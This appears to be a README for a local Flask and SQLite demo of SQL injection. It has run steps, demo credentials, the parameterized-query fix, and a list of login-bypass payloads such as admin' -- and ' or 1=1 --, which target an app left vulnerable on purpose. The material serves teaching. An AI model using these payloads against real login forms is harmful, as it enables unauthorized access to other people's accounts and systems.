SQL Injection Demo using Python Flask + SQLite

How to Run:
1. Install requirements: pip install -r requirements.txt
2. Run the app: python app.py
3. Open browser: http://localhost:5000
4. Try login with:
   Username: admin
   Password: admin123

5. Then try SQL Injection:
   Username: admin' --
   Password: [leave blank]

You'll bypass authentication.

Fix (not implemented in this version):
Use parameterized queries:
  c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))





python3 -m venv venv 
source venv/bin/activate
pip install -r requirements.txt
pip install --upgrade pip
python app.py



try

c.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
result = c.fetchone()



SQL Injection
# with admin name 
username : admin' --
pass: [leave empty / fill something]

# without admin name
username : ' or 1=1 --
pass: [leave empty / fill something]

# hybrid
username : admin' or 1=1 --
pass: [leave empty / fill something]

# with user name and using true condition in password
username : admin
password : ' or 1=1 --




